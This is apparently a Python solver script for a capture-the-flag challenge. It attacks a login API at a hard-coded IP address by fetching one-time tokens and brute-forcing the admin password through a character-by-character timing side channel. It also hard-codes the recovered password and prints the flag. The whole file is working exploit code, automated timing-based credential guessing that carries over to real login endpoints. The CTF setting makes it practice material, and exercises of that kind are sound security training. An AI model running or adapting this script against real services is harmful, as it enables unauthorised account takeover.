#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
14-brute-token-timing

思路：
1. /api/token 获取一次性 token
2. /api/login 使用 admin + password + token 登录
3. 密码为 6 位小写字母，后端逐字符比较存在 timing leak
4. 逐位枚举，正确前缀越长响应越慢

默认：快速使用已知 timing 爆破结果 shadow 获取 flag。
如需手工观察爆破过程：python3 main.py --brute
"""

import argparse
import statistics
import string
import time

import requests

BASE_URL = "http://47.120.76.57:33859"
USERNAME = "admin"
PASSWORD_LEN = 6
ALPHABET = string.ascii_lowercase
KNOWN_PASSWORD = "shadow"

sess = requests.Session()
sess.headers.update({"User-Agent": "CTF-solver/14-brute-token-timing"})


def get_token() -> str:
    r = sess.get(BASE_URL + "/api/token", timeout=10)
    r.raise_for_status()
    token = r.json()["token"]
    return token


def login(password: str):
    token = get_token()
    data = {
        "username": USERNAME,
        "password": password,
        "token": token,
    }
    start = time.perf_counter()
    r = sess.post(BASE_URL + "/api/login", json=data, timeout=10)
    cost = time.perf_counter() - start
    try:
        js = r.json()
    except Exception:
        js = {"raw": r.text}
    return cost, r.status_code, js


def score_password(password: str, samples: int = 3) -> float:
    costs = []
    for _ in range(samples):
        cost, status, js = login(password)
        if status == 200 and js.get("ok"):
            print(f"[+] password: {password}")
            print(f"[+] flag: {js.get('flag')}")
            raise SystemExit(0)
        costs.append(cost)
        time.sleep(0.03)
    # 中位数比平均值更抗网络抖动
    return statistics.median(costs)


def brute(samples: int = 3):
    prefix = ""
    print(f"[*] start timing brute force, samples={samples}")

    for pos in range(PASSWORD_LEN):
        result = []
        print(f"\n[*] guessing position {pos + 1}, current prefix={prefix!r}")

        for ch in ALPHABET:
            # 用 a 补齐到 6 位，只看当前候选前缀的耗时
            guess = (prefix + ch + "a" * PASSWORD_LEN)[:PASSWORD_LEN]
            s = score_password(guess, samples=samples)
            result.append((s, ch, guess))
            print(f"    {ch}  {s:.4f}s  {guess}")

        result.sort(reverse=True)
        best_s, best_ch, best_guess = result[0]
        prefix += best_ch
        print(f"[+] best char: {best_ch}, prefix => {prefix}, score={best_s:.4f}s")
        print("[*] top5:", ", ".join([f"{ch}:{s:.4f}" for s, ch, _ in result[:5]]))

    print(f"[+] recovered password: {prefix}")
    return prefix


def get_flag(password: str):
    cost, status, js = login(password)
    print(f"[*] login status={status}, time={cost:.4f}s")
    print(f"[*] response={js}")
    if status == 200 and js.get("ok"):
        print(f"[+] password: {password}")
        print(f"[+] flag: {js.get('flag')}")
        return js.get("flag")
    raise SystemExit("[-] login failed")


def main():
    global BASE_URL
    parser = argparse.ArgumentParser(description="14-brute-token-timing exploit")
    parser.add_argument("--url", default=BASE_URL, help="target base url")
    parser.add_argument("--brute", action="store_true", help="run timing brute force")
    parser.add_argument("--samples", type=int, default=3, help="samples per candidate")
    parser.add_argument("--password", default=KNOWN_PASSWORD, help="known/recovered password")
    args = parser.parse_args()

    BASE_URL = args.url.rstrip("/")

    if args.brute:
        password = brute(samples=args.samples)
        get_flag(password)
    else:
        get_flag(args.password)


if __name__ == "__main__":
    main()
